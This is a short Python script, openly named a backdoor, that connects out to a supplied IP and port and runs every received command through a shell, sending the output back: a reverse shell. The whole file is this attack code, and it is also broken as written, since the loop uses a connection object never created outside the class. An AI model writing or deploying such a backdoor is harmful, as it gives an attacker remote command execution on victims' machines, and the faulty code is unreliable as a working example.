import socket 
import subprocess

class backdoor:
    def __init__(self , ip , port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        

def execute_system_command(command):
    return subprocess.check_output(command, shell=True)


connection.send("\n[+] Connection established.\n")

while True:

    command = connection.recv(1024)

    command_result = execute_system_command(command)

    connection.send(command_result)

connection.close()
